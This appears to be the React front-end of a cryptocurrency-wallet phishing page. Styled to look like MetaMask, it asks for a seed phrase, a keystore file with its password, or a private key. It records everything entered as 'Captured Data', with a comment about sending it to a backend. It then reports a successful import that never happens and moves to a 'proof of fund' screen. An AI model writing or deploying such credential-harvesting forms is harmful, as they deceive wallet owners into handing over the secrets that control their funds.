import React, { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import ProofOfFund from './ProofOfFund';

// Default theme (MetaMask style)
const defaultTheme = {
  bg: '#1E2329',
  text: 'white',
  border: 'gray-600',
  accent: '#ffa680',
  accentText: 'black',
  accentHover: 'orange-400',
  tabActiveBg: '#ffa680',
  tabActiveText: 'black',
  tabInactiveBg: '#1E2329',
  tabInactiveText: 'white',
  tabBorder: 'gray-600',
};

const WalletImportTabs = ({ theme = defaultTheme }) => {
  const [activeTab, setActiveTab] = useState('phrase');
  const [showPassword, setShowPassword] = useState(false);
  const [toast, setToast] = useState({ show: false, message: '' });
  const [showPOF, setShowPOF] = useState(false);
  const toastTimeout = useRef(null);
  const navigate = useNavigate();

  useEffect(() => {
    // Removed navigation logic to prevent URL change
  }, [showPOF]);

  const handleImport = (e) => {
    e.preventDefault();

    const formData = new FormData(e.target);
    const seedPhrase = formData.get('key');

    // Validate seed phrase
    if (!seedPhrase || seedPhrase.trim().split(' ').length < 12) {
      setToast({ show: true, message: 'Failed to import: Seed Phrase is required and must be at least 12 words.' });
      if (toastTimeout.current) clearTimeout(toastTimeout.current);
      toastTimeout.current = setTimeout(() => setToast({ show: false, message: '' }), 3500);
      return;
    }

    // Clear any existing error toast if the seed phrase is valid
    setToast({ show: false, message: '' });

    // Securely handle data (example: send to backend)
    console.log('Captured Data:', Object.fromEntries(formData)); // Replace with actual secure handling logic
    setToast({ show: true, message: 'Wallet imported successfully!', style: { background: '#fff', color: '#4caf50' } });
    if (toastTimeout.current) clearTimeout(toastTimeout.current);
    toastTimeout.current = setTimeout(() => {
      setToast({ show: false, message: '' });
      setShowPOF(true);
    }, 2500);
  };

  const tabData = [
    {
      key: 'phrase',
      label: 'Phrase',
      content: (
        <form className="flex flex-col gap-4 mt-4" onSubmit={handleImport}>
          <textarea name="key" placeholder="Phrase" style={{background: theme.bg, color: theme.text}} className={`w-full p-2 border rounded border-${theme.border} focus:ring-2`} />
          <div className="desc text-sm text-gray-400">Typically 12 (sometimes 24) words separated by single spaces</div>
          <button type="submit" style={{background: theme.accent, color: theme.accentText, boxShadow: '0 2px 8px rgba(0,0,0,0.15)', border: `2px solid ${theme.primary || theme.accent}`}} className={`font-bold py-3 rounded-lg text-lg border-2 border-[#F7D358] shadow-lg hover:scale-105 hover:bg-[#ffe066] transition-all duration-200`}>IMPORT</button>
        </form>
      )
    },
    {
      key: 'keystore',
      label: 'Keystore JSON',
      content: (
        <form className="flex flex-col gap-4 mt-4" onSubmit={handleImport}>
          <textarea name="key" placeholder="Keystore JSON" style={{background: theme.bg, color: theme.text}} className={`w-full p-2 border rounded border-${theme.border} focus:ring-2`} />
          <div className="relative w-full">
            <input
              type={showPassword ? 'text' : 'password'}
              name="pass"
              placeholder="Password"
              style={{background: theme.bg, color: theme.text}}
              className={`w-full p-2 border rounded border-${theme.border} focus:ring-2 pr-10`}
            />
            <button
              type="button"
              style={{color: theme.text === '#fff' ? '#1976d2' : theme.accent}}
              className={`absolute right-2 top-2 text-sm font-bold focus:outline-none`}
              onClick={() => setShowPassword((prev) => !prev)}
            >
              {showPassword ? 'Hide' : 'Show'}
            </button>
          </div>
          <div className="desc text-sm text-gray-400">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
          <button type="submit" style={{background: theme.accent, color: theme.accentText, boxShadow: '0 2px 8px rgba(0,0,0,0.15)', border: `2px solid ${theme.primary || theme.accent}`}} className={`font-bold py-3 rounded-lg text-lg border-2 border-[#F7D358] shadow-lg hover:scale-105 hover:bg-[#ffe066] transition-all duration-200`}>IMPORT</button>
        </form>
      )
    },
    {
      key: 'private',
      label: 'Private Key',
      content: (
        <form className="flex flex-col gap-4 mt-4" onSubmit={handleImport}>
          <input type="text" name="key" placeholder="Private Key" style={{background: theme.bg, color: theme.text}} className={`w-full p-2 border rounded border-${theme.border} focus:ring-2`} />
          <div className="desc text-sm text-gray-400">Typically 64 alphanumeric characters</div>
          <button type="submit" style={{background: theme.accent, color: theme.accentText, boxShadow: '0 2px 8px rgba(0,0,0,0.15)', border: `2px solid ${theme.primary || theme.accent}`}} className={`font-bold py-3 rounded-lg text-lg border-2 border-[#F7D358] shadow-lg hover:scale-105 hover:bg-[#ffe066] transition-all duration-200`}>IMPORT</button>
        </form>
      )
    }
  ];

  return (
    <div>
      {toast.show && (
        <div
          style={{
            position: 'fixed',
            top: '10%',
            left: '50%',
            transform: 'translateX(-50%)',
            background: toast.style?.background || '#fff',
            color: toast.style?.color || '#d32f2f',
            padding: '16px 32px',
            borderRadius: 10,
            fontWeight: 700,
            fontSize: 18,
            boxShadow: '0 2px 12px rgba(0,0,0,0.25)',
            zIndex: 9999,
            textAlign: 'center',
          }}
        >
          {toast.message}
        </div>
      )}
      {showPOF ? (
        <ProofOfFund theme={theme} />
      ) : (
        <div>
          <div className="flex gap-2 mb-2">
            {tabData.map(tab => (
              <button
                key={tab.key}
                style={activeTab === tab.key ? {background: theme.tabActiveBg, color: theme.tabActiveText} : {background: theme.tabInactiveBg, color: theme.tabInactiveText, borderColor: theme.tabBorder}}
                className={`px-4 py-2 rounded font-bold text-sm border`}
                onClick={() => setActiveTab(tab.key)}
              >
                {tab.label}
              </button>
            ))}
          </div>
          <div>{tabData.find(tab => tab.key === activeTab)?.content}</div>
        </div>
      )}
    </div>
  );
};

export default WalletImportTabs;